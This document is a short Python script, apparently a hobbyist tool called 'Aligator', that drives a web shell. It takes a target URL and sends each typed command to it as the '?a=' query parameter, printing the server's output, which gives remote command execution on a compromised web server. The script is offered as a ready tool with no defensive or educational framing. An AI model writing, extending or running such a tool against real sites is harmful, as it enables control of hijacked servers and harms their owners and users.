import requests
import os
import subprocess
import sys
 
print('''
          _ _             _             
    /\   | (_)           | |            
   /  \  | |_  __ _  __ _| |_ ___  _ __ 
  / /\ \ | | |/ _` |/ _` | __/ _ \| '__|
 / ____ \| | | (_| | (_| | || (_) | |   
/_/    \_\_|_|\__, |\__,_|\__\___/|_|  -- V 1.0 
               __/ |                    
              |___/    Made BY DIBO237#                   ''')

print()
url= input('Enter The Correct URL: ')
print()
print("......Connection Established......... : )")
print()
while True:
    
      try:
          payload ='?a='
          command = input("Execute Commands: ")
          r = requests.get(url + payload + command)
          r.raise_for_status()
          print(r.text)
          if command == "exit":
              exit()
      except:
           print("########### Thanks For Using Aligator. #############")
           exit()
        
